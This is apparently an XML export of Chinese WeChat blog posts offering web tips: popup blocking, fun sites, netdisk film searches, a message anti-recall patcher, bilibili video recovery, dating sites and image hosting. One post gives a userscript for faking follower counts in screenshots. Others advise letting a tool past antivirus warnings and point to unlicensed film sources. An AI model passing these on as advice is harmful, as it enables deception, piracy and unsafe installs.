获取）点击继续，再次重启浏览器后就不再出现烦人的请停用以开发者模式运行的扩展程序 这个弹窗了。 弹窗广告拦截器如果你用的不是最新版谷歌浏览器，也不想升级，推荐这个可以媲美火绒的弹窗拦截工具www.360drm.com/files/adkiller.zip（公众号内回复 谷歌 获取 ），不用安装直接运行使用。https://www.zhihu.com/question/24265718/answer/27226434 。 软件自带了一些弹窗广告拦截，都记录在文件 PublicData.txt12345160707更新QQ手机版|TXGuiFoundation|333*229||0|0|12|12百度商桥|bdim_skinedwnd|180*115||0|0|12|12WPS 热点|#32770|1920*1080|wpscenter.exe|1|0|12|12WPS 通知|#32770|1920*1080|wpsnotify.exe|1|0|12|12 这里手动添加一个拦截。 点击拖动到谷歌浏览器弹窗的地方，软件会自动捕获信息上传。 内容都自动填好了，确定即可。然后会在本地生成文件 PrivateData.txt12200527请停用以开发者模式运行的扩展程序|Chrome_WidgetWin_2|322*172|chrome.exe|1|0|12|12 再次打开Chrome浏览器，可以看到那个弹窗被拦截了，再也看不见那个烦人的弹窗了。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 一个骚操作，公众号粉丝破10万！ 微信撤回的消息也能看到！ 如何找回bilibili(b站)收藏夹里失效的视频？ 如何更优雅地使用 bilibili(b站) 如何更优雅地看电影/刷剧 那些你可能不知道的网络冷知识奇技淫巧 2020 最全百度网盘搜索，找电影资源不再愁 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣的网站（二）]]></title>
    <url>%2F2020%2F05%2F29%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第136篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过 那些有趣的网站 ，这是第2篇，其他有意思的网站在文章开头的专辑里。 互联网公司薪酬查询https://xiguajob.com/ 可查各大公司不同职级对应薪酬。国外也有个对应的 https://www.levels.fyi/ ，可查谷歌， 微软，亚马逊等公司 。 抖动文字在线生成抖动文字 https://aidn.jp/ugomoji/ ，生成后直接保存，效果如图 还有鬼畜图片GIF神器 https://aidn.jp/ygif/ 这个网站还有鬼畜文字GIF https://aidn.jp/zgif/ ，猫猫举牌GIF https://aidn.jp/necomogif/ ，故障风格文字GIF https://aidn.jp/gatcha/ 分离人声和伴奏https://ifengui.com/ 一键去除视频中bgm保留台词人声，直接上传mp3文件自动处理。 不过需要登录，每个月可处理累计10分钟长度的音频。 .https://weibo.com/5715214963/J2jlPxGEx 英文缩写查询http://shortof.com/ ，经常看到各种缩写不知道什么意思，比如CNUR是中国大学排行榜 ，这个和之前介绍的查询拼音字母缩写类似 https://lab.magiconch.com/nbnhhsh/ Windows xp 在线模拟https://winxp.now.sh/ 浏览器上在线模拟Windows xp系统，还可以玩扫雷。 还有在线的windows93 http://www.windows93.net/ 和能在Mac上运行的windows95 https://github.com/felixrieseberg/windows95 重新认识汉字https://www.zdic.net/hans/%E8%8B%8F 提供汉字的动画书写，发音和用到的诗词，适合小孩子识字。另外科学研究明表，字汉序顺定一不并响影阅读 https://works.yangerxiao.com/chinese-word-chaos/ 营销号生成器https://kaseidis.gitee.io/interesting_gadgets/marketing_generator/index.htm 跟之前分享的狗屁不通生成器类似。 公交线路辐射图https://bus.daibor.com/ ， 可视化查看任意地点周围全部公交的线路网，比如中关村图书大厦周围 500 米内有经停 10 个公交站的 35 条线路。 模拟手写字体快速转换模拟手写字体文档，让打印出的字看起来像手写的，一个软件在线解决文字抄写烦恼 http://www.beautifulcarrot.com/ 圆周率π查询https://www.1415926pi.com/ 查询某个数字在圆周率中的位置 在线漫画自动翻译 一个在线漫画自动翻译工具，不用安装，支持ocr和翻译，还能自动涂白 https://moeka.me/mangaEditor/在线简历 https://gitee.com/cool-resume 一键生成英文logohttp://emblemmatic.org/markmaker 输入你想生成的英文logo名称，网站会自动帮你生成超过100个对应的logo模板。 骗子查询https://www.cxmao.cn/ 可查询骗子的微信，QQ和手机 最后分享2个经典游戏，在线超级马里奥 https://game.ioxapp.com/mario/ 在线俄罗斯方块 https://chvin.github.io/react-tetris/?lan=zh-cn 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 一个骚操作，公众号粉丝破10万！ 微信撤回的消息也能看到！ 如何找回bilibili(b站)收藏夹里失效的视频？ 如何更优雅地使用 bilibili(b站) 如何更优雅地看电影/刷剧 那些你可能不知道的网络冷知识奇技淫巧 2020 最全百度网盘搜索，找电影资源不再愁 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 最全百度网盘搜索，找电影资源不再愁]]></title>
    <url>%2F2020%2F05%2F29%2F2020-%E6%9C%80%E5%85%A8%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%90%9C%E7%B4%A2%EF%BC%8C%E6%89%BE%E7%94%B5%E5%BD%B1%E8%B5%84%E6%BA%90%E4%B8%8D%E5%86%8D%E6%84%81%2F</url>
    <content type="text"><![CDATA[苏生不惑第135 篇原创文章，将本公众号设为星标，第一时间看最新文章。 经常有小伙伴在公众号后台问我要电影资源，下面就分享下我是如何找电影资源的，有了这些途径找影视资源不再愁。 搜索引擎比如想找周星驰的电影《喜剧之王》，在谷歌搜索 site:pan.baidu.com 周星驰 喜剧之王，不过没有结果，可能百度网盘屏蔽了搜索引擎抓取，site搜索语法见我之前的文章那些你可能不知道的搜索奇技淫巧换成 喜剧之王 提取码第一个结果就是了。 不过第一个链接的百度网盘文件有点大， 如果想下载到本地参考我之前的文章 2020 年 3 月最新加速下载百度网盘文件方法 和 2020 年 4 月使用 Aria2 加速下载百度网盘文件 ，使用idm下载速度在2MB/s 左右。 不过搜索引擎里不一定能直接找到结果，这就需要去专门的网盘资源搜索网站了。 罗马盘https://www.luomapan.com/ 不用注册，免费，直接搜索找。第一个结果就是 99百度网盘搜索https://www.99baiduyun.com/ 这个网站需要注册，不过很简单，随意写个就行，第一个结果就找到了，直接显示百度网盘链接。 51网盘https://m.51caichang.com/ 页面有点难看，不过能搜到就行。 小可搜搜https://www.xiaokesoso.com/ 不用注册，不过搜索匹配不大好。 大力盘https://www.dalipan.com/ 不用注册直接搜索，可以选择条件来搜索，第一个结果就是。 还有很多类似的网盘就不一一演示了，比如：123456789盘搜http://www.pansou.com/ fastsoso https://www.fastsoso.cn/ 大圣盘https://www.dashengpan.com/ 云网盘之家 https://www.wowenda.com/ 凌风云 https://www.lingfengyun.com/盘天下https://www.pantianxia.com/猪猪盘http://www.zhuzhupan.com/ 小白盘https://www.xiaobaipan.com/盘满满http://www.panmanman.com/ 还有聚合的虫部落 http://magnet.chongbuluo.com/，http://hao.misiai.com/ https://www.chaonengsou.com/ ，左侧列出了10几个网盘搜索网站。 油猴脚本如果还不想收藏网址，用油猴脚本吧，在百度云盘页面中新增百度网盘资源_搜索引擎 https://greasyfork.org/zh-CN/scripts/375337 ，如何安装油猴见之前的文章Chrome 浏览器扩展神器油猴 打开百度网盘主页 https://pan.baidu.com/disk/home ，下拉框列出了几十个网盘搜索网站，直接搜索关键词跳到对应的网站。 另外再推荐网盘助手脚本 https://greasyfork.org/zh-CN/scripts/378301，可以帮你自动填写百度网盘的提取码，还支持腾讯微云和蓝奏云，不知道提取码也能打开网盘资源。效果如图 如果看百度网盘的视频想加速播放的话推荐一个 Chrome 插件 Video Speed Controllerhttps://chrome.google.com/webstore/detail/video-speed-controller/nffaoalbilbmmfgbnbgppjihopabppdk ，安装Chrome扩展参考之前的文章上不了谷歌如何安装 Chrome 扩展？ 如果你要找的资源在上面那么多网盘资源网站还没有，那使用这个油猴脚本吧，聚合n多电影网站资源，具体见之前的文章搜不到你想看的书/音乐/电影？一个油猴脚本帮你搞定 最后再分享个网站 www.549.tv/ ，包含在线影视站，影视下载站，磁力搜索站，影视APP，字幕组，资源站等上百个优质网站。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 一个骚操作，公众号粉丝破10万！ 微信撤回的消息也能看到！ 如何找回bilibili(b站)收藏夹里失效的视频？ 如何更优雅地使用 bilibili(b站) 如何更优雅地看电影/刷剧 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信撤回的消息也能看见！]]></title>
    <url>%2F2020%2F05%2F22%2F%E5%BE%AE%E4%BF%A1%E6%92%A4%E5%9B%9E%E7%9A%84%E6%B6%88%E6%81%AF%E4%B9%9F%E8%83%BD%E7%9C%8B%E8%A7%81%EF%BC%81%2F</url>
    <content type="text"><![CDATA[苏生不惑第134 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于微信之前写过了： 那些你可能不知道的微信奇技淫巧 那些你可能不知道的网络冷知识奇技淫巧 一个骚操作，公众号粉丝破10万！ 如何发一条空白的朋友圈 如何在电脑上登陆多个微信 想看的公众号文章被删了怎么办？ 如何备份可能被删的公众号文章和网页 这次要分享的是微信防撤回工具https://github.com/huiyadanli/RevokeMsgPatcher（还支持QQ和TIM，在公众号内回复 微信 获取工具），即使你撤回了消息，我也能看到，支持最新版微信客户端2.9.0.112 软件很小，不到100K，下载后不用安装直接运行（运行前先关闭正在运行的微信/QQ/TIM），最好用管理员身份运行，如果安装了杀毒软件可能会弹出警告，放行即可。 应用路径是你的微信默认安装路径，如果识别不正确，可以自己修改下，右键微信软件属性可以看到路径。点击一键防撤回提示安装成功。 下面开始看效果了，看撤回的文字（手机上撤回一样的）。 提示对方撤回一条消息，但那条消息还在。撤回的图片也能看到，我这里用2个微信测试的，登录多个微信可以看之前的文章如何在电脑上登陆多个微信。还有撤回的语音。 QQ就不演示了，如果不想用撤回功能了，直接退出程序删除文件即可。 推荐历史文章: 2019 年公众号 苏生不惑 近百篇原创文章整理 想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床 如何找回bilibili(b站)收藏夹里失效的视频？ 如何更优雅地使用 bilibili(b站) 如何更优雅地看电影/刷剧 关于 苏生不惑 公众号 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何找回bilibili(b站)收藏夹里失效的视频？]]></title>
    <url>%2F2020%2F05%2F22%2F%E5%A6%82%E4%BD%95%E6%89%BE%E5%9B%9Ebilibili-b%E7%AB%99-%E6%94%B6%E8%97%8F%E5%A4%B9%E9%87%8C%E5%A4%B1%E6%95%88%E7%9A%84%E8%A7%86%E9%A2%91%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[苏生不惑第133 篇原创文章，将本公众号设为星标，第一时间看最新文章。 今天就是 520 了，还没对象的朋友看看我之前的文章 听说 520 你还没对象，来这里看看 正好在今天中国人民银行发行了2020吉祥文化金银纪念币一套，该套纪念币共6枚，其中金质纪念币2枚，银质纪念币3枚，金银双金属纪念币1枚，均为中华人民共和国法定货币 https://weibo.com/2803301701/J2b5Zuo9A ，详情可看中国人民银行的公众号文章中国人民银行发行2020吉祥文化金银纪念币 关于b站之前已经写过了下列文章： 那些我关注的 b 站 up 主 bilibili(b站)升级到BV号了，还想用av号怎么办？ 那些你可能不知道的 bilibili 奇技淫巧 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 如何更优雅地使用 bilibili(b站) 今天打开了下b站的收藏夹，发现之前收藏的很多视频都没了，时间越早失效的视频越多。 失效的视频变成了无封面，不可点击，也不知道什么时候没的，想要找回来怎么办呢？下面分享几个方法。 Chrome扩展Btools这是个Chrome扩展，可以查看失效视频的简介、分P名以及UP主，可能会帮你想起这个失效视频。未失效的视频可以快速打开封面、UP主空间、跳转哔哩哔哩唧唧 https://www.jijidown.com/ 。 扩展地址https://chrome.google.com/webstore/detail/btools/codgofkgobbmgglciccjabipdlgefnch ，安装Chrome扩展参考我之前的文章上不了谷歌如何安装 Chrome 扩展？ 安装扩展前的收藏夹： 安装扩展后可以看到3个失效视频的封面和标题。点击后跳转百度搜索。第一个结果就是 https://www.bilibili.com/video/av21105994/?p=2 ，只是打不开了。 然后谷歌搜索标题 周星驰超长经典电影片段3部合集。 找到了这个视频，然后用idm直接下载到本地，下载视频可以参考我之前的文章如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 被up主删除的视频也能显示标题和封面。点击后跳转百度搜索可以看到视频为什么被删的这篇文章 https://www.bilibili.com/read/cv4991721/ 如果封面和标题都没则显示缓存失效。 点击后会跳转到up主空间 https://space.bilibili.com/34662364 ，不过账号被封了，联系不了了。 油猴脚本除了使用Chrome扩展还可以安装一个油猴脚本，关于油猴脚本不用多说，之前介绍过很多次了，安装油猴扩展见我之前的文章Chrome 浏览器扩展神器油猴 打开 https://greasyfork.org/zh-CN/scripts/383143 直接安装。 修复 哔哩哔哩(www.bilibili.com) 失效的收藏。（可查看av号、简介、标题、封面） 和上面的Chrome扩展一样，失效的视频显示出封面和标题，还能直接复制av号和简介。 点击后跳转 https://www.biliplus.com/video/av21105994/ ，可以看到av号是21105994，上传的up主id，播放数，弹幕数，收藏等数据，这个网站简直b站镜像。曾经的评论还能显示出来！还支持弹幕下载。 以上方法只能大概率帮你找回失效的b站视频，因为视频可能在其他网站也发布了，如果在网络上都找不到了，联系下上传视频的up主，看他是否还有备份。 为了防止收藏的视频被删找不到了，看到好的视频及时下载到本地吧，推荐这个下载工具（公众号内回复 b站 获取）下载b站视频，支持bv。 命令行工具推荐annie，直接annie -f 16 https://www.bilibili.com/video/av69858806 下载。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 一个骚操作，公众号粉丝破10万！ 想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床 那些好玩的生成器网站 如何更优雅地使用 bilibili(b站) 如何更优雅地看电影/刷剧 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[听说 520 你还没对象，来这里看看]]></title>
    <url>%2F2020%2F05%2F22%2F%E5%90%AC%E8%AF%B4-520-%E4%BD%A0%E8%BF%98%E6%B2%A1%E5%AF%B9%E8%B1%A1%EF%BC%8C%E6%9D%A5%E8%BF%99%E9%87%8C%E7%9C%8B%E7%9C%8B%2F</url>
    <content type="text"><![CDATA[苏生不惑第132 篇原创文章，将本公众号设为星标，第一时间看最新文章。 又快到一年一度的虐狗节 520，你还没找到对象吗？这里推荐几个不错的找对象网站（非某缘某合）。 掘金相亲https://juejin.im/topic/5abcaa67092dcb4620ca335c 让互联网没有单身狗，这里聚集的都是互联网行业的小伙伴，看到合适的就在评论区聊起来吧，大多数人都直接留了微信。 不过这个网站搜索功能不好用，直接用谷歌搜索吧。 爱豆瓣http://www.lovedouban.com/?type=1 这个网站聚合了豆瓣/合知乎两大网站的交友帖子，无广告，点击后直接进入知乎问答或者豆瓣帖子，赶紧搜索自己的理想对象吧。 这个网站还提供了数据分析http://www.lovedouban.com/data ，右侧都是知乎问题。 恋爱广场和上面的类似，https://lovebazaar.info/ ，这个网站里全是知乎里的相亲交友贴，点击链接跳转知乎回答。 这个网站搜索功能好用点，支持根据关键词按回答时间和性别搜索。 交友安全在确定男女朋友关系（或者结婚前）前，建议去以下几个网站查一下对方的个人信用，然后再决定是否交往 ，所谓防患于未然嘛。 中国执行信息公开网 http://zxgk.court.gov.cn/ ，可查对方是否为失信被执行人。 中国裁判文书网 http://wenshu.court.gov.cn/ ，可查对方有无犯罪记录或者经济纠纷债权债务。 人民银行征信中心 https://ipcrs.pbccrc.org.cn/，可查个人信用记录，这个需本人查询，一个月不要查询超过三次。 毕业生找工作不知公司是否靠谱，可以在全国企业信用信息公示系统查询是否为正规公司 http://bj.gdgs.gov.cn/ 挑选对象 有弟子问苏格拉底，什么是爱情？苏格拉底让他走过一个麦田，只能向前，只能捡一个麦穗要求他捡到最大的麦穗有弟子没走几步就捡了一个然后发现了更大的于是后悔不已有弟子总觉得后面有更大的麦穗，结果空手而归苏格拉底说：这就是爱情！ 人一生中会遇见很多人，如何才能不留遗憾的找到自己的真命天子呢？推荐看看李永乐老师的视频 https://www.bilibili.com/video/BV1Cb411A7pT 甚至还有个 37% 法则 https://weibo.com/5780974966/J1AL2xfOC 表白经历过上面这些，你们终于快要在一起了，把表白新姿势 这篇文章的链接 https://mp.weixin.qq.com/s/F81vFxfhqUinxxgbaifS1w 发给TA，让TA用电脑打开，浏览器按 ctrl+f 搜索9，效果如图： 或者使用百度传情，打开百度搜索 表白（这算是百度的一个彩蛋，我之前的文章写过那些有意思的谷歌/百度搜索彩蛋）输入对方名字和表白内容。生成一个随机密码94552285 。 让对方在百度搜索解蜜94552285 就能看见你的表白内容了。 当然这只是我的一个建议，不一定有效哈，或许送个包更合适，毕竟包治百病。 或者直接发个520红包吧（每到这一天微信红包额度提高到 520，可以发超过200的红包了）。 顺便再带上几句情话，分享个教你说情话的网站 https://lovelive.tools/再来一条如果你会开发可以跟这个帖子里的男朋友一样做个小程序。https://www.douban.com/group/topic/170558638/ 最后分享个网站https://sushengbuhuo.gitee.io/love/（公众号内回复 520 获取网址和99张我爱你电影截图），点击no会一直出提示，直到点击yes，如果你有服务器，可以修改源码里的文字后上传到自己服务器发给对方，祝有情人终成眷属。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 一个骚操作，公众号粉丝破10万！ 想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床 那些好玩的生成器网站 如何更优雅地使用 bilibili(b站) 如何更优雅地看电影/刷剧 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个骚操作，公众号苏生不惑粉丝破10万！]]></title>
    <url>%2F2020%2F05%2F15%2F%E4%B8%80%E4%B8%AA%E9%AA%9A%E6%93%8D%E4%BD%9C%EF%BC%8C%E5%85%AC%E4%BC%97%E5%8F%B7%E8%8B%8F%E7%94%9F%E4%B8%8D%E6%83%91%E7%B2%89%E4%B8%9D%E7%A0%B410%E4%B8%87%EF%BC%81%2F</url>
    <content type="text"><![CDATA[苏生不惑第131 篇原创文章，将本公众号设为星标，第一时间看最新文章。 公众号粉丝终于破10万了，有图有真相，看我录制的GIF，刷新公众号后台粉丝数是100068。 是不经常在微信朋友圈，微博，或者知乎上看到某些营销号晒各种赚钱的收入截图，甚至还有GIF和视频为证，保证交钱就带你赚钱，看得你心痒痒，实际上这些截图可能都是假的，如同我上面录制的GIF （GIF工具见我之前的文章 那些好用的 GIF 录制工具），这个GIF的效果是不看起来很逼真，怎么做的呢？先来说说修改网页元素。 我的内心os:这个公众号离10万还有很大的距离，如果这个GIF是真的就好了，可以的话各位大佬帮忙宣传下，感谢。 控制台修改网页元素打开公众号后台，右键选择检查。可以看到总用户数在 weui-desktop-data-overview__desc 这个class内 ，直接修改成100068 ，现在就可以截图给人看了。 觉得这样麻烦？想随意修改网页可以在控制台执行document.designMode = &quot;on&quot; 数字右侧可以看到有光标了 ，然后随意修改了。 我录制了个GIF，看得更清晰。 不过这样修改的数字在网页刷新后又恢复原样了，如果想刷新后也生效的话就需要用油猴脚本来实现了。 油猴扩展如果你的谷歌浏览器没有安装油猴扩展那真是浪费了，有了油猴你会发现原来浏览器还有这么多功能，比如去广告，看VIP视频，下载视频等，安装油猴扩展见我之前的文章Chrome 浏览器扩展神器油猴 和 上不了谷歌如何安装 Chrome 扩展？ 安装扩展后在扩展程序 chrome://extensions/ 可以看到油猴。 百度网盘的加速下载也是通过油猴脚本来实现的，之前写过文章2020 年 3 月最新加速下载百度网盘文件方法 这里再额外说下idm下载百度网盘文件，还是不断有人在后台问为什么下载不了，要先选择文件才有生成链接选项，如果提示403错误，修改应用id，等弹出框里显示文件大小后下载，这个脚本还算稳定，直到今天还能用。 下载速度在2MB/s左右。 新建油猴脚本安装完油猴扩展后打开公众号后台，点击油猴扩展图标，添加新脚本。 这里就是编写脚本的地方了，之前的文章 如何更优雅地看电影/刷剧 去除爱奇艺视频的 logo 也是这样修改的。复制以下代码，第一行是修改新消息数，第二行是修改新增人数，第三行是修改总用户数，数字你可以随意改。123456789(function() &#123; 'use strict';setTimeout(function()&#123; document.querySelectorAll('.weui-desktop-data-overview__desc')[0].innerText = 686; document.querySelectorAll('.weui-desktop-data-overview__desc')[1].innerText = 8680; document.querySelectorAll('.weui-desktop-data-overview__desc')[2].innerText = 100068;&#125; ,100) &#125;)(); 然后ctrl+s保存，可以在管理面板看到刚加的脚本了。 之后在公众号后台可以看到油猴脚本已加载（不想加载可以手动关闭），再次刷新公众号后台显示总用户数100068，新增人数8680，新消息数686。 其他网站的修改也是一样的，比如b站粉丝数也可以这样来操作，我也录制了个GIF。 最后提个醒，不要轻信各种截图，有专门的虚假截图生成工具，比如https://fakes.netlify.app/ ，可以修改文字和图片。 微信聊天也一样，有很多类似的网站可以生成微信对话内容 https://hu-qi.github.io/vjietu-justChat/ 如果你也想自己录制个类似的GIF或视频，可以根据我的这篇文章来操作，有什么问题在文章末尾留言。 最近我整理了几个专辑（就是文章开头那个来自专辑，收录了我整理的一系列文章），可点击下面链接进入，欢迎在看收藏。 玩转微信系列 实用工具系列 百度网盘系列 黑科技系列 Chrome扩展神器系列 这些网站有意思系列 生活系列 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床 那些好玩的生成器网站 如何更优雅地使用 bilibili(b站) 如何更优雅地看电影/刷剧 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床]]></title>
    <url>%2F2020%2F05%2F15%2F%E6%83%B3%E6%96%B9%E4%BE%BF%E5%BF%AB%E6%8D%B7%E7%9A%84%E5%88%86%E4%BA%AB-%E6%94%B6%E8%97%8F%E5%9B%BE%E7%89%87%EF%BC%9F%E8%AF%95%E8%AF%95%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BE%AE%E5%8D%9A-b%E7%AB%99%E5%9B%BE%E5%BA%8A%2F</url>
    <content type="text"><![CDATA[苏生不惑第130 篇原创文章，将本公众号设为星标，第一时间看最新文章。 最近我整理了几个专辑（就是文章开头那个来自专辑，收录了我整理的一系列文章），可点击下面链接进入，欢迎在看收藏。 玩转微信系列 实用工具系列 百度网盘系列 黑科技系列 Chrome扩展神器系列 这些网站有意思系列 生活系列 如果你想收藏或者分享图片，推荐使用免费的微博/b站图床，虽然有很多第三方图床，但小网站可能不知道什么时候就挂了，微博和b站这种大公司就不用担心了。 微博虽然是个社交平台，如果你不想发微博，可以把微博只当图床用，先把图发到微博（发无水印图片可以在pc端关闭水印），再复制图片地址，删掉微博，然后把图片发到其他地方。 微博图床为了使用方便，有人开发了Chrome 扩展微博图床 ，上传图片到微博更方便了 https://chrome.google.com/webstore/detail/pinjkilghdfhnkibhcangnpmcpdpmehk ，安装Chrome扩展可以看我之前的文章上不了谷歌如何安装 Chrome 扩展？ 微博图床，支持选择、拖拽、粘贴、网页右键上传图片，并生成图片地址，支持浏览和删除历史记录，支持同步上传记录上传到图片到微博，同步到微相册，并生成外链。 先登录微博，然后点击扩展图标弹出窗口。 上传图片直接生成一个URL https://tva2.sinaimg.cn/large/a2005469gy1geg905adcbj20by0byjs8.jpg图片还是无水印的大图。你也可以选择各种尺寸大小的图。 关于微博图片的尺寸再说下，比如在微博上看到一张周杰伦的图片。不过这图片也太小了，根本看不清，怎么找到清晰的呢？微博会生成几张不同尺寸的图片，常用的有以下几种形式： 缩略图地址http://ww1.sinaimg.cn/thumbnail/c08d7e89ly1g3efjakqsaj20hs0b4dgt.jpg小图地址http://ww1.sinaimg.cn/small/c08d7e89ly1g3efjakqsaj20hs0b4dgt.jpg中等图地址http://ww1.sinaimg.cn/bmiddle/c08d7e89ly1g3efjakqsaj20hs0b4dgt.jpg大图地址http://ww1.sinaimg.cn/large/c08d7e89ly1g3efjakqsaj20hs0b4dgt.jpg 所以把小图URL地址中的thumbnail改为large就很清晰了。网页上的图片也能直接右键上传。 在微博相册可以看到刚上传的那张图。 如果你不想安装Chrome扩展也可以使用客户端软件PicGo 上传图片到微博 https://molunerfinn.com/PicGo/ 查找微博博主看到这种无水印图片（或者有水印图片但微博昵称改了）如果想知道是哪个微博博主发的，怎么找呢？以刚才上传的图片地址 https://tva2.sinaimg.cn/large/a2005469gy1geg905adcbj20by0byjs8.jpg 为例，文件名 a2005469gy1geg905adcbj20by0byjs8，前 8 位16进制的a2005469 通过 https://tool.lu/hexconvert/ 转换为10进制的2717930601 （如果转换后找不到用62进制再转下），发这张图片的微博博主主页地址就是 https://weibo.com/2717930601 有人还开发了Chrome扩展 微博图片反查 https://github.com/fei-ke/WeiboImageReverse 或者使用在线工具 ，直接输入图片地址获取博主微博 https://gongpeione.github.io/wbimg2wb/，https://toolmao.com/tool/img2weibo/ 微博相册下载如果想下载自己或他人的微博相册图片，可以使用Chrome扩展微博相册批量下载https://chrome.google.com/webstore/detail/octo%E5%BE%AE%E5%8D%9A%E7%9B%B8%E5%86%8C%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD/cdimdlckbkfelaogjhfbkjcfncbpngkn 进入微博个人主页，点击扩展图标，再选择需要下载的相册，比如王菲的微博https://www.weibo.com/u/1629810574选择一个微博头像相册，有6张图片，很快下载好了。 最后如果你想下载微博视频，可以看之前的文章如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ b站图床如果你没有微博账号，也不想注册，推荐这个Chrome扩展 bilibili 图床https://chrome.google.com/webstore/detail/bilibili%E5%9B%BE%E5%BA%8A/aofnmlfiomopkmgdngoehlndjcinbhfb 登录b站账号，点击 bilibili 图床 图标，上传图片生成b站地址http://i0.hdslb.com/bfs/article/f8dff5e2737380037756fc13ff049075e51356ae.jpg ，然后可以把这个图片地址分享出去了。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 手把手教你申报2019个人所得税（已退税1800） 那些好玩的生成器网站 如何更优雅地使用 bilibili(b站) 如何更优雅地看电影/刷剧 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些好用的无版权免费图片网站]]></title>
    <url>%2F2020%2F05%2F09%2F%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E6%97%A0%E7%89%88%E6%9D%83%E5%85%8D%E8%B4%B9%E5%9B%BE%E7%89%87%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[苏生不惑第128 篇原创文章，将本公众号设为星标，第一时间看最新文章。 平常搜图片一般直接在谷歌搜，可能一不小心就侵权了，这里分享些好用的无版权免费图片网站。 unsplash这个共享摄影的网站比较知名,该网站声称有超过110000名特约摄影师,不过没有中文界面 https://unsplash.com/ pexels才华横溢的摄影作者在这里免费分享最精彩的素材照片和视频 https://www.pexels.com/zh-cn/ pixabay免费正版高清图片素材库，Pixabay拥有超过百万张优质图片和视频素材，让你轻松应对各种设计场景 https://pixabay.com/zh/提供各种尺寸格式下载，可惜没法中文搜索。 Hippopx基于CC0协议的免版权图库 https://www.hippopx.com/zh colorhub高清无版权图片，个人和商业用途免费 https://colorhub.me/ freeimages搜索和下载免费素材 ，个人和商业使用全部免费 https://cn.freeimages.com/ cc0聚合全球免费可商用的图片素材 http://cc0.cn/ 插图这个网站里的插图免费公开无版权 https://undraw.co/illustrations比如这个在线学习 表情包搜狗出的表情包搜索 https://pic.sogou.com/pic/emo/index.jsp如果想自己制作可以使用https://www.doutula.com/maker，https://fabiaoqing.com/diy， https://www.doutula.com/maker AI人脸生成如果不想用真正的明星照，用ai生成吧，使用 StyleGAN生成“各种明星脸之间的混合” http://154.8.171.175:8098/再生成几张，颜值都挺高的。 类似的还有 https://generated.photos/faces#，https://make.girls.moe/#/ ，https://thispersondoesnotexist.com/ ，https://www.thiswaifudoesnotexist.net/ 天空之城提供航拍图片的网站 https://www.skypixel.com/ 泼辣有图开源摄影，为世界提供免费美丽图像 http://www.polayoutu.com/collections 聚合搜索一键搜索多家免版权图库，再也不用担心商用图片侵权了https://www.logosc.cn/so/ 还有个多搜搜‬ http://pic.duososo.com/ ，有22个网站搜索聚合。 查找更多同类网站上面只分享了10个，其实还有很多，推荐使用similarsites这个网站查找类似网站，比如 pexels 的同类网站 https://cn.similarsites.com/site/pexels.com ， 这个功能你懂得 ，它还有对应Chrome扩展 https://chrome.google.com/webstore/detail/similar-sites-discover-re/necpbmbhhdiplmfhmjicabdeighkndkn ，安装Chrome扩展见之前文章上不了谷歌如何安装 Chrome 扩展？ 推荐历史文章: 如何更优雅地看电影/刷剧 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 手把手教你申报2019个人所得税（已退税1800） 那些好玩的生成器网站 如何更优雅地使用 bilibili(b站) 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些好玩的网站（二）]]></title>
